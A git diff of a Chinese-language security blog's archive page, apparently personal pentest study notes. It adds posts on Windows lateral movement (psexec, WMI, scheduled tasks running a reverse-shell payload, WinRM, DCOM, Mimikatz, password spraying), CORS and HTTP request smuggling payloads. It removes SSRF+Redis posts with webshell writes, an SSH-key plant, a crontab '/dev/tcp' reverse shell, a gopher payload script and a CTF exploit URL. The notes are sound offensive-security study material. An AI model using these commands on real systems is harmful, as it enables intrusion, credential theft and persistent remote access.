@@ -118,6 +118,369 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/06/02/Lateral-Movementt/" class="title">Lateral Movementt</a>
+    <section class="desc">
+  PSEXEC优点：微软的东东
+执行原理： 
+
+通过ipc$连接，释放psexesvc.exe到目标机器
+
+通过服务管理SCManager远程创建psexecsvc服务，并启动服务
+
+客户端连接执行命令，服务端启动相应的程序并执行回显数据。
+
+运行完后删除服务
+
+
+使用方式：
+1、先建立IPC通道连接，然后直接使用
+net use \\192.168.0.116\ipc$ “password” /user:administrator
+psexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    2、在psexec的参数中指定账户密码
+psexec.exe \\192.168.0.116 –u administrator –p password  cmd -accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框
+-hashes可支持hash密码
+使用psexec最低要求
+
+远程机器的 139 或 445 端口需要开启状态，即 SMB；
+
+
+明文密码或者 NTLM 哈希；
+
+
+具备将文件写入共享文件夹的权限；
+
+
+能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；
+
+
+能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）
+
+在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec
+WMI执行原理：
+WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹
+利用条件：
+
+WMI服务开启，端口135，默认开启。
+
+防火墙允许135、445等端口通信。
+
+
+wmic（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：
+工作组横向：
+wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;域内横向：
+wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”wmiexec： 
+获取半交互式shell：
+cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password在远程系统上执行单条命令：
+cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;在远程系统上执行bat脚本：
+cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat使用hash的情况：wce注入hash再进行连接
+wce –s 账号:主机名或域的名字:LM:NTLM
+
+cscript //nologo wmiexec.vbs /shell 192.168.0.1注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash
+Invoke-WMIMethod  （powershell自带,执行单条命令）
+$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred其他的利用还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)
+scService Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件
+copy service.exe \\192.168.0.116\admin$\temp
+
+sc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;
+
+sc \\192.168.0.116 start TestService
+
+sc \\192.168.0.116 delete TestServicemsfvenom生成service exe：
+-f exe-serviceCS生成service exe：
+输出项选择windows service exe计划任务win xp/2003 为at命令
+win7+ 为schtasks命令
+利用条件：
+
+目标管理员账户凭据
+
+当前机器可正常net use到远程机器
+
+目标机器的计划任务服务“Task scheduler”已正常启动
+
+
+net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享
+
+net time \\192.168.0.116###查看目标主机当前时间
+
+xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payload
+
+chcp 437  ###如果目标为中文系统，需要先调整字符集
+
+schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务
+
+schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行
+
+schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态
+
+schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务参数讲解：
+/TN：任务名称
+/TR：任务执行的程序
+/ST：任务执行的时间
+winRMWindows Remote Management通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理
+利用条件：
+
+在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。
+
+防火墙对5986、5985端口开放。
+
+
+powershell：
+第一次执行winrm：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。
+Set-Item WSMan:localhost\client\trustedhosts -value *
+Restart-Service WinRM常用命令：
+Enable-PSRemoting -force   ###需要目标机器开启远程管理
+
+Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口
+
+Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任
+
+Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令
+
+Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框用户凭证使用：
+$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}直接使用mimikatz获取远程机器的账户密码：(在域中测试成功，工作组没能成功)
+Import-Module ./Invoke-Mimikatz.ps1
+Invoke-Mimikatz -ComputerName TARGETwinrs：
+winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令
+winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shellevil-winrm 可通过用户凭证密码/hash直接获得交互shell
+DCOMCOM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。
+DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据
+获取DCOM列表
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
+或
+Get-CimInstance Win32_DCOMApplication  #需win12以上存在某些具有命令执行功能的DCOM，可用于横向移动
+MMC20.Application COM：（域中测试成功，工作组只能本地成功而不能远程）查看该DCOM信息：
+Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;与目标建立连接：
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))
+$com.Document.ActiveView | Get-Member通过ExecuteShellCommand执行程序：
+$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)Excel.Application
+自动化脚本
+## Password Spraying ##
+Password Spraying实际上是域用户爆破
+首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值
+自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证
+Import-Module .\DomainPasswordSpray.ps1 
+Invoke-DomainPasswordSpray -Password password其他可选参数：
+UserList-用于Spraying的用户列表。 如果未指定，将自动生成。
+password-用于Spraying的单个密码。
+PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）
+OutFile-输出结果到指定文件
+domain-要对其进行Spraying的域。
+Force-强制喷Spraying继续进行而不提示确认
+RDPsharpRDP：SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456
+CS中实现：
+
+基于tscon的RDP会话劫持https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/
+https://pentestlab.blog/tag/rdp-session-hijacking/
+https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
+PTH&amp;PTT&amp;OverPTH:没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。
+当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权
+需要设置为1，非内置的sid为500的用户才能进行远程连接
+不会影响本地Administrators组中的域帐户，仅影响本地帐户
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fhttps://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
+printers, open webroots, good old Tomcat还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境
+链接：
+https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
+https://lengjibo.github.io/LateralMovement/
+https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
+https://ired.team/offensive-security/lateral-movement
+https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/
+https://my.oschina.net/u/4283892/blog/3307767
+
+
+</section>
+    <p class="sub">Jun 2, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/" class="title">CORS配置不当学习</a>
+    <section class="desc">
+  CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。
+SOP（Same-origin policy：##SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象
+同源三要素：
+
+同域名 
+同协议 
+同端口
+
+CORS（Cross-origin Resourse SharingCORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源
+CORS实现：（简单请求/非简单请求）
+请求头：
+1、origin,用于说明本次请求来自哪个源（域名+协议+端口）
+2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法
+3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段响应头：
+1、Access-Control-Allow-Origin(ACAO) 
+用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*
+2、Access-Control-Allow-Credentials
+表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials漏洞挖掘：CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。
+使用burpsuit进行快速验证：
+
+访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:
+
+也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true绕过：
+NULL源
+使用目标域名作为子域名
+…
+
+CORS与JSONP的比较
+CORS与JSONP的使用目的相同，但是比JSONP更强大。
+JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
+更多学习链接：
+CORS三种攻击场景： https://xz.aliyun.com/t/4663
+CORS安全完全指南： https://xz.aliyun.com/t/2745
+
+
+</section>
+    <p class="sub">Jun 2, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/06/02/HTTP-Request-Smuggling/" class="title">HTTP Request Smuggling</a>
+    <section class="desc">
+  HTTP请求走私（HTTP Request Smuggling）
+原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突
+HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞
+这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击
+
+Content-LengthContent-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）
+POST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+q=smugglingTransfer-EncodingPOST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+b---&gt; data长度，十六进制
+q=smuggling---&gt;data
+0---&gt;结束符，后接\r\n\r\nKeep Alive##在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。
+相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接
+危害能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户
+漏洞类型
+CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
+TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
+TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   
+
+Transfer-Encoding: xchunked
+
+
+Transfer-Encoding : chunked
+
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding: x
+
+
+
+Transfer-Encoding:[tab]chunked
+
+
+
+[space]Transfer-Encoding: chunked
+
+
+
+X: X[\n]Transfer-Encoding: chunked
+
+
+
+Transfer-Encoding
+
+: chunked漏洞检测&amp;验证&amp;利用
+需要关闭自动更新Content-Length功能：
+
+漏洞检测：
+POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+Q上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。
+检测TE.CL
+POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G0终止符后，后端将超时，等待X到达
+两种数据包比较：
+
+漏洞验证
+
+漏洞利用：(发包需要多试几次)
+CL.TE:
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GTE.CL:
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0终止符0后边接 \r\n\r\n
+TE.TE：
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: xxx
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0多种利用案例靶场：https://portswigger.net/web-security/request-smuggling/exploiting  
+案例视频讲解： https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10
+https://xz.aliyun.com/t/6878 —&gt;内含很多利用案例
+https://www.youtube.com/watch?v=kgkRih2MQtU
+https://portswigger.net/web-security/request-smuggling
+https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 内含很多利用案例
+
+
+</section>
+    <p class="sub">Jun 2, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/" class="title">邮件伪造</a>
     <section class="desc">
   SPF：Sender Policy FrameworkSPF
@@ -1018,242 +1381,6 @@ https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-exa
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/05/19/SSRF-Redis/" class="title">SSRF+Redis</a>
-    <section class="desc">
-  猪猪侠SSRF议题
-形成SSRF的代码示例：
-&lt;?php
-function curl($url){  
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_exec($ch);
-curl_close($ch);
-}
-$url = $_GET[&apos;url&apos;];
-curl($url);
-?&gt;SSRF绕过限制：
-利用短网址
-
-xip.io  –&gt; 127.0.0.1.xip.io
-
-@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）
-
-dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/
-
-更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1
-
-协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
- 
-
-
-
-Redis未授权绝对路径写webshell：
-flushall
-set 1 ‘‘ 
-config set dir /var/www/html
-config set dbfilename shell.php
-save
-
-写ssh公钥：
-ssh-keygen -t rsa ###生成公钥
-flushall
-set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
-config set dir /root/.ssh/
-config set dbfilename authorized_keys
-save
-
-写contrab定时任务反弹shell：
-
-flushall
-set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
-config set dir /var/spool/cron/
-config set dbfilename root
-save
-
-SSRF+Redis利用
-http、https 内网服务探测
-file-读取文本
-file:///etc/passwd
-….
-dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）
-
-dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
-gopher 万能协议反弹shell：(redis利用需要REST编码)
-Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
-import urllib
-protocol=&quot;gopher://&quot;
-ip=&quot;127.0.0.1&quot;
-port=&quot;6379&quot;
-payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
-filename=&quot;shell.php&quot;
-path=&quot;/var/www/html&quot;
-passwd=&quot;&quot;
-cmd=[&quot;flushall&quot;,
- &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
- &quot;config set dir {}&quot;.format(path),
- &quot;config set dbfilename {}&quot;.format(filename),
- &quot;save&quot;
- ]
-if passwd:
-cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
-payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
-def redis_format(arr):
-CRLF=&quot;\r\n&quot;
-redis_arr = arr.split(&quot; &quot;)
-cmd=&quot;&quot;
-cmd+=&quot;*&quot;+str(len(redis_arr))
-for x in redis_arr:
-cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
-cmd+=CRLF
-return cmd
-if __name__==&quot;__main__&quot;:
-for x in cmd:
-payload += urllib.quote(redis_format(x))
-print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800
-
-SSRF利用redis之不换行
-FLUSHALL
-config set dir /var/www/html/
-set a1 ZY%16%0E%16F
-set a2 ffffff
-BITOP XOR payload a1 a2
-append payload eval($_GET[c]);%3f&gt;
-config set dbfilename cmd.php
-save
-
-Gopher有如下几点问题
-
-PHP的curl默认不跟随302跳转
-curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
-file_get_contents()的SSRF，gopher协议不能使用URLencode
-file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败
-
-SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
-目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
-view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
-&lt;?php
-
-$serverList = array(
-&quot;127.0.0.1&quot;
-);
-$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
-foreach ($serverList as $host) {
-if ($ip === $host) {
-if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
-@eval($_POST[&apos;hacker&apos;]);
-} else {
-die(&quot;You aren&apos;t admin!&quot;);
-}
-} else {
-die(&apos;This is webshell&apos;);
-}
-}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
-exp = &apos;&apos;&apos;\
-POST /webshe11231231231.php HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: deflate
-DNT: 1
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 56
-admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
-&apos;&apos;&apos;
-import urllib
-tmp = urllib.quote(exp)
-new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
-result = &quot;_&quot;+urllib.quote(new)
-print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”
-
-如上图所示，所以需要两次编码
-生成paylaod：
-kali@kali:~$ python exp.py
-_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
-152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A
-
-
-</section>
-    <p class="sub">May 19, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/" class="title">域渗透之隐藏管理员用户和派生本地管理员</a>
-    <section class="desc">
-  典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）
-常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。
-这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现
-域隐藏管理账户：
-A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。
-由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A
-Derivative Local Admins（派生本地管理员）：在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：
-经典案例：（在这个例子中，Sally是WorkStation A中的派生本地管理员）
-
-环境描述：
-
-域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  
-
-域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员
-
-Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录
-
-Sally在 “Workstation C”上登录
-
-
-通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。
-直接截取原文中的实际利用步骤：
-
-则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）
-那么我们简化一下上边的图，画出自己的理解图：
-
-隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找
-使用Bloodhound查找隐藏管理账户的几种方法：
-
-Map Domain Trust
-左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员
-搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights
-
-
-
-</section>
-    <p class="sub">May 1, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/" class="title">域控提权之DNSadmins</a>
-    <section class="desc">
-  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
-利用条件：
-拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
-whoami /groups  查看用户组
-
-制作dll：
